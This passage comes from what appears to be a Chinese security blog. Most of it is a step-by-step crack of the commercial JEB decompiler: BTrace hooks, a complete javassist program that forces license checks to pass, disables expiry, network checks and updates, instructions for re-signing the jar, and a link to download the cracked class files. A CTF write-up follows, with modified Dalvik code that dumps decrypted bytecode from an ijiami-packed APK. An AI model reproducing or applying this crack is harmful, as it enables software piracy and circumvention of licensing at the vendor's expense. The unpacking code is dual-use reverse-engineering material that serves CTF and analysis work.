<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import com.sun.btrace.annotations.*;  </div><div class="line">import static com.sun.btrace.BTraceUtils.*;  </div><div class="line"></div><div class="line">@BTrace</div><div class="line">public class TraceHelloWorld &#123;</div><div class="line">		@OnMethod</div><div class="line">		(clazz = &quot;java.lang.System&quot;, method = &quot;exit&quot;)</div><div class="line">		public static void Trace_exit()</div><div class="line">		&#123;</div><div class="line">			println( &quot;jstack() is :&quot; );</div><div class="line">			println( &quot;[&quot; );</div><div class="line">			jstack();</div><div class="line">			println( &quot;]&quot; );</div><div class="line">		&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508820717781912l6lzi.png?imageslim" alt="paste image"></p>
<p>这里有个小问题,如果你是通过运行jeb_wincon.bat 或者 jeb.exe来启动jeb的话你是看不到他开启的 java进程的，所以可以使用 <code>everything</code> 搜索<code>org.eclipse.equinox.launcher*jar</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508820877604x2xuse0y.png?imageslim" alt="paste image"></p>
<p>然后运行那个 jar 包就可以正常的找到 <code>jeb启动的 java 进程</code> 了，这样我们才可以使用 Btrace 脚本进行 hook. 至于为什么是这样的，我也不记得当初是怎样找到的。可以去逆向 <code>jeb.exe</code> 或者 看使用 <code>org.eclipse.equinox</code> 开发的教程可以弄清楚。其实通过 <code>Btrace</code> 然后配合着静态分析就可以解决这个软件了我认为。</p>
<p>Jeb里面会使用一个函数对字符串进行加密，所以在逆向的时候会很不方便，当初我是用 IDEA 调试它，然后 在 IDEA 的调试环境里面，调用解密函数(使用IDEA的自带的功能)，把加密后的字符串解密后，然后再分析的。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15088226254701n26it6w.png?imageslim" alt="paste image"></p>
<p>使用IDEA调试其实非常简单，我们只需要先新建一个 project , 然后把相关的jar包添加到 Project 的 lib, 然后调用 jar 包中的函数即可。比如</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508821465891r2f5xrjy.png?imageslim" alt="paste image"></p>
<p>信息比较杂，看我画圈的那段代码即可。然后进入想要下断点的位置，正常的下个断点就可以了。</p>
<p>比如我们已经知道，程序权限校验的关键逻辑在 jeb.jar中，我们直接调用 jeb.jar中的 main 方法，然后进去调试里面的代码即可</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508821704636jxtite92.png?imageslim" alt="paste image"></p>
<p>赏心悦目的调试，美滋滋。分析或者调试 <code>jeb.jar</code> ，就可以找到 字符串加密的那个方法。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508822313678ssj9on8b.png?imageslim" alt="paste image"><br>如果没有目标，我们可以使用 Btrace hook 这个函数，打印他的返回值，就可以看到程序中各种被解密后的字符串了。脚本如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">import static com.sun.btrace.BTraceUtils.println;</div><div class="line">import static com.sun.btrace.BTraceUtils.str;</div><div class="line">import static com.sun.btrace.BTraceUtils.strcat;</div><div class="line">import static com.sun.btrace.BTraceUtils.timeMillis;</div><div class="line">import static com.sun.btrace.BTraceUtils.jstack;</div><div class="line"></div><div class="line"></div><div class="line">import com.sun.btrace.annotations.BTrace;</div><div class="line">import com.sun.btrace.annotations.Kind;</div><div class="line">import com.sun.btrace.annotations.Location;</div><div class="line">import com.sun.btrace.annotations.OnMethod;</div><div class="line"></div><div class="line">@BTrace</div><div class="line">public class TraceHelloWorld &#123;</div><div class="line">		@OnMethod</div><div class="line">		(clazz = &quot;com.pnfsoftware.jebglobal.GN&quot;, method = &quot;dL&quot;)</div><div class="line">		public static void Trace_exit()</div><div class="line">		&#123;</div><div class="line">			println( &quot;ret is :   &quot; );</div><div class="line">			println( &quot;[&quot; );</div><div class="line">			jstack();</div><div class="line">			println( &quot;]&quot; );</div><div class="line">			println( &quot;-------------------------------------------------------&quot; );</div><div class="line">			println( &quot;-------------------------------------------------------&quot; );</div><div class="line">			println( &quot;-------------------------------------------------------&quot; );</div><div class="line">			println( &quot;-------------------------------------------------------&quot; );</div><div class="line">		&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>经过各种翻看代码，调试， Hook, 终于找到一些可能是比较关键的函数，我们该怎么办呢？ 这时可以使用 <code>javassist</code> 来修改目标 方法。<br>比较懒，把破解 JEB 期间的所有代码都放到 一个 函数里面了，做了一定的注释。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div></pre></td><td class="code"><pre><div class="line">package me.hacklh;</div><div class="line"></div><div class="line">import com.pnfsoftware.jeb.Launcher;</div><div class="line">import javassist.ClassPool;</div><div class="line">import javassist.CtClass;</div><div class="line">import javassist.CtMethod;</div><div class="line">import javassist.CtNewMethod;</div><div class="line">import com.pnfsoftware.jeb.installer.*;</div><div class="line">import org.eclipse.core.launcher.Main;</div><div class="line">import com.pnfsoftware.jeb.client.Licensing;</div><div class="line"></div><div class="line"></div><div class="line">public class JebCracker &#123;</div><div class="line"></div><div class="line">    public static void main(String[] args) throws Exception &#123;</div><div class="line"></div><div class="line">//        com.pnfsoftware.jeb.installer.Launcher.main(new String[]&#123;&quot;--di&quot;&#125;);</div><div class="line">//        DES.main(args);</div><div class="line">         Launcher.main(new String[]&#123;&quot;--generate-key&quot;&#125;);</div><div class="line">        CtClass.debugDump = &quot;./debugDump/&quot;;</div><div class="line"></div><div class="line">        System.out.println(Licensing.allowAnyClient());</div><div class="line"></div><div class="line">//        Main.main(args);</div><div class="line"></div><div class="line">        /**</div><div class="line">         * 修改安装时的校验, 避免去下载网络安装文件，直接使用我们事先下好的文件就行</div><div class="line">         */</div><div class="line">        ClassPool pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.installer&quot;);</div><div class="line">        CtClass old_class = pool.get(&quot;com.pnfsoftware.jeb.installer.Package&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        CtMethod old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;verifyData&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(byte[].class.getName()),</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line">        /**</div><div class="line">         * 修改getStatus， AbstractContext会起几个线程修改status</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.client.AbstractContext&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jeb.client.AbstractContext&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;getStatus&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return 0;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;terminate&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line">        /**</div><div class="line">         * internet 检测</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jebglobal.tB&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jebglobal.tB&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line"></div><div class="line">                (</div><div class="line">                        &quot;dL&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(boolean.class.getName()),</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;run&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line">        /**</div><div class="line">         * 增加许可证的过期时间</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.client.Licensing&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jeb.client.Licensing&quot;);</div><div class="line">        old_class.detach();</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;getExpirationTimestamp&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return real_license_ts + 345600000;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;isInternetRequired&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return false;&quot;);</div><div class="line"></div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;isFullBuild&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;canUseCoreAPI&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;canUseCoreAPI&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line">        /**</div><div class="line">         * patch 掉与网络下载有关的函数，禁止升级</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.util.net.Net&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jeb.util.net.Net&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line"></div><div class="line">                (</div><div class="line">                        &quot;downloadBinary&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(String.class.getName())</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return null;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;httpPost&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(String.class.getName()),</div><div class="line">                                        pool.get(String.class.getName()),</div><div class="line">                                        pool.get(long[].class.getName())</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return null;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>运行后会在工程目录生成一个文件夹，以你修改的类名为目录结构。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508823032290g5jxwh19.png?imageslim" alt="paste image"></p>
<p>把这些 class文件替换到来的 jar 包里面就可了。<br>可以使用 winrar 把 jar 包打开，找到对应目录，拖进去替换就行了。<br>替换之后要去 META-INF 删掉一些东西。具体看下图</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508823340258i9tfkhxn.png?imageslim" alt="paste image"></p>
<p>这样就完成了jar包的修改。<br>最后说下静态分析jar包的工具，使用 JEB 就可以。首先把jar 转换为 dex.</p>
<hr>
<p>dx.bat –dex –output=d:\dst.dex src.jar</p>
<hr>
<p>然后拿起jeb分析就行了。</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>如果你看到了这里，并且按我前面所说的方式一步一步破解了jeb, 那么恭喜你和我一样被坑了。弄得差不多的时候，我发现有一个神奇的类。<br><code>com.pnfsoftware.jeb.client.Licensing</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508823755460wqmsw9br.png?imageslim" alt="paste image"></p>
<p>瞬间爆炸，我们只要修改这里的函数的返回值，或者直接重写这个类，就可以基本搞定这款软件了。52破解上的  jeb 2.2.7 中延长使用时间 就是修改的这个类的方法（后面才看的，悲伤~~）</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508823969930hxe2xs6n.png?imageslim" alt="paste image"></p>
<p>编译后 <a href="https://gitee.com/hac425/blog_data/blob/master/jeb_data.zip" target="_blank" rel="external">Class文件，点我</a> ，用它去替换jeb.jar中的相应文件即可,具体替换方法，文中有介绍。</p>
<p>分析过程的一些笔记<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">2.3.3</div><div class="line">com.pnfsoftware.jebglobal.cF  用于获取serial, uuid 生成字符串</div><div class="line">  .At---&gt; get uuid  </div><div class="line">  .GQ----&gt; get serial number   </div><div class="line">  .dL------&gt;     get_md5、</div><div class="line">com.pnfsoftware.jebglobal.eI  sC方法会检测运行时间，定时退出  校验运行时间  patch</div><div class="line">com.pnfsoftware.jeb.client.Licensing    licensing 校验   ， 修改该类的方法的返回值可以拿到大量的结果</div><div class="line">com.pnfsoftware.jebglobal.Wr                        重要函数，程序初始化， 保存功能</div></pre></td></tr></table></figure></p>
<p>分析过程中的另外的 Btrace脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">/* BTrace Script Template */  </div><div class="line">import com.sun.btrace.annotations.*;  </div><div class="line">import static com.sun.btrace.BTraceUtils.*;  </div><div class="line">/*  </div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">@BTrace  </div><div class="line">public class TracingScript &#123;  </div><div class="line"></div><div class="line">  @OnMethod(  </div><div class="line">    clazz = &quot;com.pnfsoftware.jebglobal.Wr&quot;, </div><div class="line">    method = &quot;saveProject&quot;)  </div><div class="line">   public static void traceExecute()&#123;  </div><div class="line">      jstack();  </div><div class="line">      println(strcat(&quot;--------------:--\n&quot;,&quot;********************\n&quot;));  </div><div class="line">   &#125;  </div><div class="line">  </div><div class="line">&#125;  </div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">@BTrace  </div><div class="line">public class TracingScript &#123;  </div><div class="line"></div><div class="line">  @OnMethod(  </div><div class="line">    clazz = &quot;com.pnfsoftware.jebglobal.qI&quot;, </div><div class="line">    method = &quot;getKey&quot;,</div><div class="line">    location=@Location(Kind.RETURN)  </div><div class="line">  )  </div><div class="line">   public static void traceExecute(@Self com.pnfsoftware.jebglobal.qI object, @Return String result)&#123;  </div><div class="line">      println(strcat(&quot;ret: &quot;,str(result)));  </div><div class="line">      jstack();  </div><div class="line">      println(strcat(&quot;--------------:--\n&quot;,&quot;********************\n&quot;));  </div><div class="line">   &#125;  </div><div class="line">  </div><div class="line">&#125;  </div><div class="line"></div><div class="line">*/</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">@BTrace  </div><div class="line">public class TracingScript &#123;  </div><div class="line"></div><div class="line">  @OnMethod(  </div><div class="line">    clazz = &quot;com.pnfsoftware.jebglobal.GN&quot;, </div><div class="line">    method = &quot;dL&quot;,</div><div class="line">    location=@Location(Kind.RETURN)  </div><div class="line">  )  </div><div class="line">   public static void traceExecute(@Self com.pnfsoftware.jebglobal.GN object, byte[] var0, int var1, int var2, @Return String result)&#123;  </div><div class="line">      println(strcat(&quot;ret: &quot;,str(result)));  </div><div class="line">      jstack();  </div><div class="line">      println(strcat(&quot;--------------:--\n&quot;,&quot;********************\n&quot;));  </div><div class="line">   &#125;  </div><div class="line">  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> jeb破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jeb </tag>
            
            <tag> 破解 </tag>
            
            <tag> jar包调试 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[【天翼杯安卓题二】 爱加密脱壳实战]]></title>
      <url>/2017/10/22/aijiami_unpacker.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  这个apk使用爱加密加密，加密时间是2017.6月。这个题其实就是个脱壳题，脱完立马见flag。(出题人也太懒了)</p>
<p>题目链接：<a href="https://gitee.com/hac425/blog_data/blob/master/app02.apk" target="_blank" rel="external">https://gitee.com/hac425/blog_data/blob/master/app02.apk</a></p>
<h3 id="壳介绍"><a href="#壳介绍" class="headerlink" title="壳介绍"></a>壳介绍</h3><p>爱加密的壳16年年底就已经开始通过 <code>hook dvmResolveClass</code> ，在调用具体方法时解密方法指令，然后将 DexFile结构体中的对应方法的 <code>md-&gt;insns</code> 指向 解密后的方法指令数据区，然后进入 <code>真正的dvmResolveClass</code>中执行指令，执行完后在重新加密指令，这样就可以防止 <code>dexhunter</code> 等工具在内存中 <code>dump dex</code> 文件。</p>
<p>流程图</p>
<p><img src="/img/android_sec/ijiami_flow.png" alt="流程图"></p>
<p><a href="http://www.cnblogs.com/2014asm/p/6534189.html" target="_blank" rel="external">图片来源</a> </p>
<h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p>由上面可以知道，在<code>dvmResolveClass</code>函数执行的时候，代码是已经还原好了的。这时我们去<code>dump</code>相应的指令就是正确的指令。于是修改 <code>dvmResolveClass</code> 的代码，<code>dump</code> 方法的数据。<br>修改 <code>dvmResolveClass</code> 函数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/*  add dump .....*/   </div><div class="line">    </div><div class="line">  char key_str[20] = &quot;jiajiatest&quot;;</div><div class="line">  int fd=open(&quot;/data/local/tmp/resolve_class_config&quot;,O_RDONLY,0666);</div><div class="line">  if(fd!=-1)&#123;</div><div class="line">    int len = read(fd,key_str,19);</div><div class="line">    key_str[len-1] = &apos;\x00&apos;;</div><div class="line">    key_str[len] = &apos;\x00&apos;;</div><div class="line">    close(fd);</div><div class="line">  &#125;</div><div class="line">  ALOGI(&quot;The key_str ---&gt; %s----referrer-&gt;descriptor---&gt;%s--&quot;, key_str, referrer-&gt;descriptor);</div><div class="line">  </div><div class="line">if(strstr(referrer-&gt;descriptor, key_str))&#123;</div><div class="line">       char task_name[] = &quot;task_name&quot;;</div><div class="line">      char *logbuf = new char[1024];</div><div class="line">      char path[50] = &#123;0&#125;;</div><div class="line">      sprintf(path, &quot;/data/local/tmp/%s_dump_%d&quot;, key_str, getpid());</div><div class="line">      FILE *fpw = fopen(path, &quot;awb+&quot;);</div><div class="line">      for(int i=0; i &lt; referrer-&gt;directMethodCount; i++)&#123;</div><div class="line">        Method* md = &amp;referrer-&gt;directMethods[i];</div><div class="line">        const char* mName_d = md-&gt;name;</div><div class="line">        const u2 insSize_d = md-&gt;insSize;</div><div class="line">        const u2* insns_d = md-&gt;insns;</div><div class="line">        const u2 methodldx_d = md-&gt;methodIndex;</div><div class="line">        u4 insns_d_size = dvmGetMethodInsnsSize(md);</div><div class="line">// ALOGI(&quot;hacklh_md----&gt;%p, i--&gt;%d, directMethodCount--&gt;%d&quot;, md, i,referrer-&gt;directMethodCount);</div><div class="line">        sprintf(logbuf,&quot;-------------- (KL)resolving [class=%s, method=%s, methodIndex=%u, insSize=%u, insns_d=%x, codeSize=%d] in pid: %d(name: %s)&quot;,referrer-&gt;descriptor,mName_d,methodldx_d,insSize_d,(u4)insns_d, insns_d_size,getpid() , task_name);</div><div class="line">        LOGD(&quot;%s&quot;,logbuf);</div><div class="line">        if(fpw != NULL)&#123; </div><div class="line">          fwrite(logbuf,1,strlen(logbuf),fpw);</div><div class="line">          fflush(fpw);</div><div class="line">          fwrite((u1*)insns_d,1,insns_d_size*2, fpw);</div><div class="line">          fflush(fpw);</div><div class="line">        &#125;else&#123;</div><div class="line">          LOGD(&quot;——(KL)open %s fail!&quot;, path);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      for(int i=0; i &lt; referrer-&gt;virtualMethodCount; i++)&#123;</div><div class="line">        Method* mv = &amp;referrer-&gt;virtualMethods[i];</div><div class="line">        const char* mName_v = mv-&gt;name;</div><div class="line">        const u2 insSize_v = mv-&gt;insSize;</div><div class="line">        const u2* insns_v = mv-&gt;insns;</div><div class="line">        const u2 methodIdx_v = mv-&gt;methodIndex;</div><div class="line">        u4 insns_v_size = dvmGetMethodInsnsSize(mv);</div><div class="line">        sprintf(logbuf,&quot;-------------- (KL)resolving [class=%s, method=%s, methodIndex=%u, insSize=%u, insns_d=%x, codeSize=%d] in pid: %d(name: %s)&quot;,referrer-&gt;descriptor,mName_v,methodIdx_v,insSize_v,(u4)insns_v, insns_v_size,getpid() , task_name);</div><div class="line">        LOGD(&quot;%s&quot;,logbuf);</div><div class="line">        if(fpw != NULL)&#123;</div><div class="line">          fwrite(logbuf,1,strlen(logbuf),fpw);</div><div class="line">          fflush(fpw);</div><div class="line">          fwrite((u1*)insns_v,1,insns_v_size*2, fpw);</div><div class="line">          fflush(fpw);</div><div class="line">        &#125;else&#123;</div><div class="line">          LOGD(&quot;%s&quot;,&quot;——(KL)open file fail!&quot;);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      if(fpw != NULL)&#123;</div><div class="line">        fclose(fpw);</div><div class="line">      &#125;</div><div class="line">      delete logbuf;</div><div class="line">/*  add end .....*/</div></pre></td></tr></table></figure>
<p>dump之后我们需要把指令patch到dex对应位置上去，patch的方式有很多种，我选择使用ida脚本对他进行patch。我觉得ida就是一个各种文件格式的loader，我们可以在ida中修改文件的内容，然后可以让ida把修改应用到文件中，以完成patch。 因此在IDA中patch代码十分的方便，而且也很方便的查看patch后的结果。patch代码的流程是： </p>
<hr>
<p>读取dump的方法指令—&gt;定位相应方法指令数据区在ida中的位置—-&gt;patch</p>
<hr>
<p>代码如下：</p>
